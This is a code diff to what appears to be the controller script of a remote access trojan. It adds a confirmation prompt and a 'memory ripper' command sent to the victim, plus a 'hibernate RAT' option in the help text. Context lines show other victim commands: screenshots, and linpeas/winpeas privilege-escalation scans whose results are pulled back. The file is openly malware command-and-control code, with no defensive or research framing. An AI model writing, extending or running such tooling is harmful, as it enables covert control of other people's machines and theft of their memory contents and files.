@@ -118,6 +118,14 @@ def handler(sig, frame):
     stopThread = True
     sys.exit(0)
 
+
+def confirmation(command):
+    choice = input("DO YOU WANT TO EXECUTE: " + Fore.RED + command + Fore.RESET + " ???? y/n ")
+    execute = False
+    if choice == "y":
+        execute = True
+    return execute
+
 def filterCommand(command):
     global stop
     if command == "screenshot":
@@ -132,6 +140,11 @@ def filterCommand(command):
         stop = True
         send(command)
         recvFiles("linPEAS", ".txt")    
+    elif command == "memory ripper":
+        if (confirmation(command)):
+            send(command)
+        else:
+            print("RIPPER ABORTED ")
     else:  
         # SEND THE COMMAND TO THE VICTIM    
         send(command)
@@ -154,7 +167,12 @@ def helpPrinter():
         - winpeas
         - linpeas
         -> force mode: linpeas force
-    
+        
+    > RIPPERS (!!!)
+        - memory ripper
+
+    > HIBERNATE RAT
+        - hibernate-10 (hibernates the RAT 10 seconds)
     """)
 
 if __name__ == '__main__':
